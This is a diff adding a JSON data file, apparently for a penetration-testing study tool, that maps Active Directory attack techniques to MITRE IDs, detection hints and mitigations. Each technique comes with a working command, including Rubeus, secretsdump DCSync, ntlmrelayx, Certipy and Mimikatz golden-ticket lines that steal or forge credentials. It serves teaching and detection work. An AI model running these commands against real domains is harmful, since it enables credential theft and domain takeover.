@@ -1,0 +1,484 @@
+{
+  "phase": {
+    "id": "ad-bridge",
+    "title": "Active Directory Bridge",
+    "summary": "Out-of-scope for v1 deep content. These stub nodes hand the user off to a future 'Windows AD PrivEsc' module — they exist so the graph terminates cleanly.",
+    "icon": "network"
+  },
+  "nodes": [
+    {
+      "id": "ad-kerberoast",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "Kerberoasting (overview)",
+      "severity": "high",
+      "difficulty": "oscp-basic",
+      "summary": "Request service tickets for accounts with SPN, crack offline.",
+      "mitre_attack_id": "T1558.003",
+      "tags": [
+        "ad",
+        "kerberos",
+        "credentials"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "Rubeus",
+          "code": "Rubeus.exe kerberoast /outfile:roast.txt"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1558.003",
+          "url": "https://attack.mitre.org/techniques/T1558/003/",
+          "kind": "mitre"
+        }
+      ],
+      "description_md": "Kerberoasting requests Kerberos Service Tickets (TGS) for accounts with registered Service Principal Names (SPNs). These tickets are encrypted with the service account's NTLM hash and can be cracked offline to recover the plaintext password.\n\n**How it works**: Any domain user can request a TGS for any SPN (`KRB_TGS_REQ`). The KDC encrypts the ticket with the service account's hash. The ticket is taken offline and cracked with Hashcat (mode `-m 13100` for RC4 / `18200` for AES).\n\n**Targets**: Service accounts with weak passwords are most crackable — look for `$krbtgt` is not the target; focus on custom service accounts like `svc_sql`, `svc_backup`, `svc_web`.\n\n**Tools**:\n- `Rubeus.exe kerberoast /outfile:hashes.txt` — outputs crackable hashes\n- `GetUserSPNs.py` (Impacket) — from Linux\n\n**Mitigation**: Use Managed Service Accounts (MSA/gMSA) with 128-char auto-rotating passwords; require AES-only encryption for SPNs (prevents RC4 roasting).",
+      "detection_hints": "TGS requests for non-machine SPNs by user accounts at unusual times; high volume of `KRB_TGS_REQ` for service accounts; Rubeus/GetUserSPNs execution (EID 4769)."
+    },
+    {
+      "id": "ad-asreproast",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "AS-REP Roasting (overview)",
+      "severity": "high",
+      "difficulty": "oscp-basic",
+      "summary": "Accounts with PreAuth disabled hand out crackable AS-REPs unauthenticated.",
+      "mitre_attack_id": "T1558.004",
+      "tags": [
+        "ad",
+        "kerberos",
+        "credentials"
+      ],
+      "snippets": [
+        {
+          "shell": "bash",
+          "title": "Impacket",
+          "code": "GetNPUsers.py DOMAIN/ -no-pass -usersfile users.txt -format hashcat -outputfile asrep.txt"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1558.004",
+          "url": "https://attack.mitre.org/techniques/T1558/004/",
+          "kind": "mitre"
+        }
+      ],
+      "description_md": "AS-REP Roasting targets Active Directory accounts that have the 'Do not require Kerberos preauthentication' flag set (`DONT_REQUIRE_PREAUTH`). Without preauthentication, the KDC returns an encrypted AS-REP containing a portion encrypted with the user's password hash — crackable offline.\n\n**No credentials required**: AS-REP roasting can be performed unauthenticated (just need network access to the DC) by specifying a list of usernames to probe.\n\n**Tools**:\n```bash\nGetNPUsers.py DOMAIN/ -no-pass -usersfile users.txt -format hashcat -outputfile asrep.txt\n```\n```cmd\nRubeus.exe asreproast /format:hashcat /outfile:asrep.txt\n```\n\n**Crack**: Hashcat `-m 18200` (Kerberos 5 AS-REP etype 23)\n\n**Finding targets**: `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth`\n\n**Prevalence**: Less common than Kerberoasting but encountered in AD environments with legacy applications or misconfigurations.",
+      "detection_hints": "Multiple AS-REQ messages without pre-auth timestamps (EID 4768 with result 0x0); enumeration of accounts with DONT_REQUIRE_PREAUTH flag; GetNPUsers execution on endpoints."
+    },
+    {
+      "id": "ad-acl-abuse",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "ACL abuse (DACL writes)",
+      "severity": "critical",
+      "difficulty": "oscp-advanced",
+      "summary": "GenericWrite / WriteDACL / WriteOwner over an object yields shadow-credentials, RBCD, or password reset.",
+      "tags": [
+        "ad",
+        "acl",
+        "bloodhound"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "BloodHound Cypher hint",
+          "code": "MATCH p=shortestPath((u {owned:true})-[r*1..]->(t)) WHERE u<>t RETURN p"
+        }
+      ],
+      "references": [],
+      "description_md": "Active Directory object ACLs (DACLs) grant granular rights over AD objects. Misconfigured ACEs can allow low-privilege users to modify high-privilege objects — escalating to Domain Admin without exploiting any CVE.\n\n**High-value ACEs to look for** (via BloodHound):\n- `GenericWrite` on a user → add to groups, modify SPN (Kerberoast), or shadow credentials\n- `GenericWrite` on a computer → configure RBCD, add SPN\n- `WriteDACL` on any object → add any ACE you want\n- `WriteOwner` → take ownership, then WriteDACL\n- `ForceChangePassword` on a user → reset their password without knowing the current one\n- `GenericAll` → full control (add to groups, change password, DCSync rights)\n\n**BloodHound Cypher** for shortest path:\n```\nMATCH p=shortestPath((u {owned:true})-[r*1..]->(n {highvalue:true})) RETURN p\n```\n\n**Tools**: BloodHound/SharpHound for discovery, PowerView (`Set-DomainObjectAcl`) for exploitation.",
+      "detection_hints": "ACL modification events (EID 5136) on AD objects; BloodHound collection followed by ACE modifications; unexpected group membership changes or SPN additions."
+    },
+    {
+      "id": "ad-dcsync",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "DCSync",
+      "severity": "critical",
+      "difficulty": "oscp-advanced",
+      "summary": "DS-Replication-Get-Changes(-All) rights → pull every credential in the domain.",
+      "mitre_attack_id": "T1003.006",
+      "tags": [
+        "ad",
+        "dcsync",
+        "credentials"
+      ],
+      "snippets": [
+        {
+          "shell": "bash",
+          "title": "Impacket secretsdump",
+          "code": "secretsdump.py -just-dc DOMAIN/admin@DC01"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1003.006",
+          "url": "https://attack.mitre.org/techniques/T1003/006/",
+          "kind": "mitre"
+        }
+      ],
+      "description_md": "DCSync abuses the DS-Replication-Get-Changes-All right (and DS-Replication-Get-Changes) to impersonate a Domain Controller and request all password hashes from Active Directory using the `GetNCChanges` DRS protocol — no code runs on the DC.\n\n**Requirements**: The account must hold both `DS-Replication-Get-Changes` AND `DS-Replication-Get-Changes-All` rights on the domain object. By default, only Domain Admins, Enterprise Admins, and DCs hold these. They can be delegated (intentionally or accidentally).\n\n**Impacket usage**:\n```bash\nsecretsdump.py -just-dc DOMAIN/admin@DC01\n```\nOutputs all user NTLM hashes, Kerberos keys, and DPAPI backup keys.\n\n**Post-DCSync**: Use `krbtgt` hash for Golden Ticket; use DA hashes for PtH/PtT lateral movement.\n\n**Detection**: DCSync generates EID 4662 (object access) events on the DC with specific GUIDs. Networks with SIEM that monitor these events will detect non-DC machines performing replication.",
+      "detection_hints": "EID 4662 on DC with replication GUIDs `{1131f6aa-...}` and `{1131f6ad-...}` from non-DC machine accounts; secretsdump/Mimikatz lsadump::dcsync executions; DS-Replication right grants (EID 5136)."
+    },
+    {
+      "id": "ad-unconstrained-delegation",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "Unconstrained Delegation",
+      "severity": "critical",
+      "difficulty": "red-team",
+      "summary": "Hosts with TRUSTED_FOR_DELEGATION cache TGTs of authenticating users — coerce a DC.",
+      "tags": [
+        "ad",
+        "kerberos",
+        "delegation"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "Find via PowerView",
+          "code": "Get-DomainComputer -Unconstrained"
+        }
+      ],
+      "references": [],
+      "description_md": "Hosts with Unconstrained Delegation (`TRUSTED_FOR_DELEGATION`) flag set receive and cache the full TGT of any user authenticating to them via Kerberos. If an attacker compromises such a host, they can extract cached TGTs — including those of Domain Admins — and use them for impersonation.\n\n**Escalation chain**:\n1. Find hosts with `TRUSTED_FOR_DELEGATION`: `Get-DomainComputer -Unconstrained`\n2. Compromise the host (it's typically a server running services that need delegation)\n3. As SYSTEM on the host, extract cached tickets: `Rubeus.exe dump /service:krbtgt` or `sekurlsa::tickets /export`\n4. Import a DA's TGT: `Rubeus.exe ptt /ticket:<base64>`\n5. DCSync or access protected resources as the DA\n\n**Coercion attack**: Combine with PetitPotam/PrinterBug to force a DC to authenticate to the unconstrained delegation host, caching the DC's TGT — instant domain compromise.\n\n**Print spooler coercion**: `SpoolSample.exe <UnconstDelegTarget> <attacker>` forces DC to auth → TGT captured.",
+      "detection_hints": "Ticket extraction events (sekurlsa::tickets) from non-DC machines; Domain Controller TGTs appearing in non-DC ticket stores; PetitPotam/SpoolSample authentication coercion activity."
+    },
+    {
+      "id": "ad-bloodhound-collect",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "BloodHound collection",
+      "summary": "Graph AD relationships to find the shortest path to Domain Admin.",
+      "description_md": "Run SharpHound from your foothold to collect sessions, ACLs, and group membership, then analyze in BloodHound. The graph turns scattered findings into a concrete escalation path.",
+      "severity": "high",
+      "difficulty": "oscp-advanced",
+      "mitre_attack_id": "T1087.002",
+      "tags": [
+        "ad",
+        "bloodhound",
+        "recon"
+      ],
+      "related": [
+        "auto-sharphound",
+        "ad-acl-abuse"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Collect",
+          "code": "SharpHound.exe -c All,GPOLocalGroup --zipfilename loot.zip"
+        }
+      ],
+      "references": [
+        {
+          "title": "BloodHound",
+          "url": "https://github.com/BloodHoundAD/BloodHound",
+          "kind": "tool"
+        }
+      ]
+    },
+    {
+      "id": "ad-constrained-delegation",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "Constrained delegation (S4U)",
+      "summary": "Abuse a service trusted for delegation to impersonate any user to its SPNs.",
+      "description_md": "If you control an account configured for constrained delegation, S4U2Self+S4U2Proxy lets you request service tickets impersonating arbitrary users (including admins) to the allowed SPNs.",
+      "severity": "critical",
+      "difficulty": "red-team",
+      "mitre_attack_id": "T1558.003",
+      "tags": [
+        "ad",
+        "delegation",
+        "kerberos"
+      ],
+      "related": [
+        "ad-unconstrained-delegation",
+        "auto-rubeus"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Rubeus S4U",
+          "code": "Rubeus.exe s4u /user:svc$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/dc.corp.local /ptt"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1558.003",
+          "url": "https://attack.mitre.org/techniques/T1558/003/",
+          "kind": "mitre"
+        }
+      ]
+    },
+    {
+      "id": "ad-rbcd",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "Resource-based constrained delegation",
+      "summary": "Write msDS-AllowedToActOnBehalfOfOtherIdentity to take over a machine.",
+      "description_md": "With write rights over a computer object, set RBCD to a controlled account, then S4U to impersonate any user (e.g. a DA) to that host's services. A favourite ACL-to-SYSTEM path BloodHound surfaces.",
+      "severity": "critical",
+      "difficulty": "red-team",
+      "mitre_attack_id": "T1098",
+      "tags": [
+        "ad",
+        "delegation",
+        "rbcd"
+      ],
+      "related": [
+        "ad-acl-abuse"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "Set RBCD",
+          "code": "Set-ADComputer TARGET$ -PrincipalsAllowedToDelegateToAccount ATTACKER$"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1098 — Account Manipulation",
+          "url": "https://attack.mitre.org/techniques/T1098/",
+          "kind": "mitre"
+        }
+      ]
+    },
+    {
+      "id": "ad-adcs-esc1",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "ADCS ESC1 — misconfigured template",
+      "summary": "Enrollee-supplied SAN on an auth template lets you mint a cert as any user.",
+      "description_md": "If a certificate template allows enrollee-supplied Subject Alternative Name and grants Client Authentication, request a cert specifying a DA's UPN, then authenticate with it (PKINIT) for a TGT. Certify/Certipy automate discovery and abuse.",
+      "severity": "critical",
+      "difficulty": "red-team",
+      "mitre_attack_id": "T1649",
+      "tags": [
+        "ad",
+        "adcs",
+        "certificates"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Certipy ESC1",
+          "code": "certipy req -u user@corp.local -p Passw0rd -ca CORP-CA -template VulnTemplate -upn administrator@corp.local"
+        }
+      ],
+      "references": [
+        {
+          "title": "SpecterOps — Certified Pre-Owned",
+          "url": "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
+          "kind": "blog"
+        }
+      ]
+    },
+    {
+      "id": "ad-adcs-esc8",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "ADCS ESC8 — NTLM relay to web enrollment",
+      "summary": "Relay coerced machine auth to the CA's HTTP enrollment for a cert.",
+      "description_md": "The CA's web enrollment often accepts NTLM. Coerce a DC (PetitPotam) and relay to `/certsrv` to obtain a cert for the DC machine account, then DCSync. A potent unauthenticated-to-DA chain.",
+      "severity": "critical",
+      "difficulty": "red-team",
+      "mitre_attack_id": "T1649",
+      "tags": [
+        "ad",
+        "adcs",
+        "ntlm-relay"
+      ],
+      "related": [
+        "kern-petitpotam",
+        "ad-dcsync"
+      ],
+      "snippets": [
+        {
+          "shell": "bash",
+          "title": "Relay to certsrv",
+          "code": "ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController"
+        }
+      ],
+      "references": [
+        {
+          "title": "SpecterOps — Certified Pre-Owned",
+          "url": "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
+          "kind": "blog"
+        }
+      ]
+    },
+    {
+      "id": "ad-pass-the-hash",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "Pass-the-Hash",
+      "summary": "Authenticate with an NTLM hash — no plaintext needed — for lateral movement.",
+      "description_md": "A recovered NTLM hash (from SAM/LSASS) authenticates over SMB/WMI without cracking. `psexec`/`wmiexec` with `-hashes` pivots to other hosts where the account is local admin.",
+      "severity": "high",
+      "difficulty": "oscp-advanced",
+      "mitre_attack_id": "T1550.002",
+      "tags": [
+        "ad",
+        "lateral-movement",
+        "ntlm"
+      ],
+      "related": [
+        "cred-sam-backup",
+        "cred-lsass-dump"
+      ],
+      "snippets": [
+        {
+          "shell": "bash",
+          "title": "PtH with wmiexec",
+          "code": "wmiexec.py -hashes :<ntlm> corp.local/administrator@10.10.10.10"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1550.002 — Pass the Hash",
+          "url": "https://attack.mitre.org/techniques/T1550/002/",
+          "kind": "mitre"
+        }
+      ]
+    },
+    {
+      "id": "ad-overpass-the-hash",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "Overpass-the-Hash / PtT",
+      "summary": "Turn an NTLM/AES key into a Kerberos TGT, then pass the ticket.",
+      "description_md": "Overpass-the-Hash uses a key to request a TGT (Rubeus `asktgt`), sidestepping NTLM detections. The resulting ticket is injected (Pass-the-Ticket) for Kerberos-only access.",
+      "severity": "high",
+      "difficulty": "red-team",
+      "mitre_attack_id": "T1550.003",
+      "tags": [
+        "ad",
+        "kerberos",
+        "lateral-movement"
+      ],
+      "related": [
+        "ad-pass-the-hash",
+        "auto-rubeus"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Rubeus asktgt + PtT",
+          "code": "Rubeus.exe asktgt /user:administrator /aes256:<key> /ptt"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1550.003 — Pass the Ticket",
+          "url": "https://attack.mitre.org/techniques/T1550/003/",
+          "kind": "mitre"
+        }
+      ]
+    },
+    {
+      "id": "ad-silver-ticket",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "Silver ticket",
+      "summary": "Forge a service ticket with a service account's key for stealthy access.",
+      "description_md": "With a service account's NTLM/AES key you can forge a TGS for that service (no DC contact), granting access as any user. Quieter than a golden ticket because it never touches the KDC.",
+      "severity": "high",
+      "difficulty": "red-team",
+      "mitre_attack_id": "T1558.001",
+      "tags": [
+        "ad",
+        "kerberos",
+        "forged-ticket"
+      ],
+      "related": [
+        "ad-kerberoast"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Mimikatz silver ticket",
+          "code": "mimikatz # kerberos::golden /user:admin /domain:corp.local /sid:<sid> /target:srv.corp.local /service:cifs /rc4:<svc_hash> /ptt"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1558.001 — Golden/Silver Ticket",
+          "url": "https://attack.mitre.org/techniques/T1558/001/",
+          "kind": "mitre"
+        }
+      ]
+    },
+    {
+      "id": "ad-golden-ticket",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "Golden ticket",
+      "summary": "Forge a TGT with the krbtgt key for domain-wide persistence.",
+      "description_md": "With the **krbtgt** account hash (from DCSync) you can forge arbitrary TGTs as any user, including non-existent admins — full domain persistence until krbtgt is rotated twice.",
+      "severity": "critical",
+      "difficulty": "red-team",
+      "mitre_attack_id": "T1558.001",
+      "tags": [
+        "ad",
+        "kerberos",
+        "persistence"
+      ],
+      "related": [
+        "ad-dcsync"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Mimikatz golden ticket",
+          "code": "mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:<domain_sid> /krbtgt:<krbtgt_hash> /ptt"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1558.001",
+          "url": "https://attack.mitre.org/techniques/T1558/001/",
+          "kind": "mitre"
+        }
+      ]
+    },
+    {
+      "id": "ad-laps-read",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "Read LAPS passwords",
+      "summary": "Delegated read of ms-Mcs-AdmPwd hands you local admin on managed hosts.",
+      "description_md": "Principals delegated read on `ms-Mcs-AdmPwd` can pull the randomized local-admin password of any LAPS-managed computer straight from AD — instant local admin on those hosts.",
+      "severity": "critical",
+      "difficulty": "oscp-advanced",
+      "mitre_attack_id": "T1555",
+      "tags": [
+        "ad",
+        "laps",
+        "credentials"
+      ],
+      "related": [
+        "enum-laps-presence",
+        "ad-acl-abuse"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "Read AdmPwd",
+          "code": "Get-ADComputer TARGET -Properties ms-Mcs-AdmPwd | Select-Object -ExpandProperty ms-Mcs-AdmPwd"
+        }
+      ],
+      "references": [
+        {
+          "title": "MS Docs — LAPS",
+          "url": "https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview",
+          "kind": "msdoc"
+        }
+      ]
+    }
+  ]
+}
